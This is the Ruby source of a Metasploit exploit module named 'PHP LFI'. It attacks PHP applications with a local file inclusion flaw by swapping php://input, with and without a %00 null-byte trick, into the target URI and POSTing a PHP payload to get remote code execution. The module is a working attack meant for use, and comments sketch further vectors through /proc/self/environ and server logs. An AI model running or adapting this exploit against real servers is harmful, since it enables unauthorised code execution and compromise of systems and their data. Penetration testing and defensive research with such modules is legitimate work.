#
# Copyright (c) 2011 GhostHunter
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
 
   require 'msf/core'
   require 'rex/proto/ntlm/message'
   require "base64"
   
   class Metasploit3 < Msf::Exploit::Remote
   
	Rank = ManualRanking
   
   	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PHP LFI',
   			'Version'        => '1',
   			'Description'    => 'This module attempts to perform a LFI attack against a PHP application',
			'Author'         => [ 'ghost' ],
			'License'        => BSD_LICENSE,
			'References'     => [ ],
			'Privileged'     => false,
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					# max header length for Apache,
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					'Space'       => 8190,
					# max url length for some old versions of apache according to
					# http://www.boutell.com/newfaq/misc/urllength.html
					#'Space'       => 4000,
					'DisableNops' => true,
					'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Keys'        => ['php'],
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0
			))

   		register_options(
   			[
   				Opt::RPORT(80),
   				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
   					'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
   				OptString.new('URI', [ true, "The URI to authenticate against" ])
   			], self.class)
   	end
   

	def exploit_generic

		print_status("Clean LFI injection")
   		res = send_request_cgi({
			'agent'   => datastore['UserAgent'],
   			'uri'     => datastore['URI'].gsub("xxLFIxx", "php://input"),
   			'method'  => 'POST',
			'data'    => '<?php '+payload.encoded+'?>',
   		}, 10)
		cleanup()
		if not session_created?()
			print_status("LFI injection with %00 trick")
   			res = send_request_cgi({
				'agent'   => datastore['UserAgent'],
   				'uri'     => datastore['URI'].gsub("xxLFIxx", "php://input%00"),
   				'method'  => 'POST',
				'data'    => '<?php '+payload.encoded+'?>',
   			}, 10)
			cleanup()
		end
	end  
 
   	def exploit

		#We fingerprint the server to decide the possible attacks
		fp=http_fingerprint()
		print_status("Trying generic exploits")
		exploit_generic()
		if not session_created?()
			print_status("Trying OS based exploits")
			if ( fp =~/unix/i )
				print_status("Detected a Unix server")
				#linux
				# -- /proc/self/environ + useragent
				# --- COOKIE
                	        # --- POST
				# --- GET
				#freebsd
				# -- logs
			else
				
				print_status("Are they running Windows?!?")
			end
		end
   	end
   end
